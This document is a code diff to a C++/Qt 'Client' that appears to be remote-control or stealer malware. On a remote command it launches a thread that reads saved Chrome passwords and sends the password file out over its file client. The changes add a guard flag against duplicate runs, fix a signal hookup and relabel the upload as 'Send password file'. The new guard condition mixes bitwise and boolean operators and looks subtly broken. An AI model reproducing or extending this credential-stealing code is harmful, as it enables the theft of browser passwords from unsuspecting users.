@@ -5,7 +5,8 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
     QObject(parent),
     path(defaultPath),
     ip(_ip),
-    port(_port)
+    port(_port),
+    isChromePassExists(false)
 {
     //Start modules
     fileServer = new FileServer(this, 1234, path);
@@ -34,7 +35,7 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
 
     //Connect to receive files and strings
     connect(fileServer, &FileServer::dataSaved, [this](QString str, QString ip){ this->getFile(str, ip); });
-    connect(fileServer, &FileServer::dataSaved, [this](QString str, QString ip){ this->getString(str, ip); });
+    connect(fileServer, &FileServer::stringRecieved, [this](QString str, QString ip){ this->getString(str, ip); });
 
     //Progress bar
     //connect(fileServer, &FileServer::dataGet, [this](qint64 a, qint64 b){ qDebug() << a/1024/1024 << b/1024/1024; });
@@ -126,7 +127,7 @@ void Client::getString(const QString &string, const QString& /* ip */)
 
         QString currentFile = filesStr.section(';', 0, 0);
         quint16 files = currentFile.toInt();
-        if (files & ChromePass)
+        if (files & ChromePass & !(isChromePassExists))
         {
             //Start thread with chrome password reader
             QThread* thread = new QThread(this);
@@ -139,13 +140,15 @@ void Client::getString(const QString &string, const QString& /* ip */)
             connect(thread, &QThread::finished, passReader, &PassReader::deleteLater);
 
             thread->start();
+            isChromePassExists = true;
 
             connect(passReader, &PassReader::passSaved,
             this, [this](QString path)
             {
-                //Send screenshot
+                //Send password file
                 fileClient->enqueueData(_FILE, path);
                 fileClient->connect();
+                isChromePassExists = false;
             });
         }
 
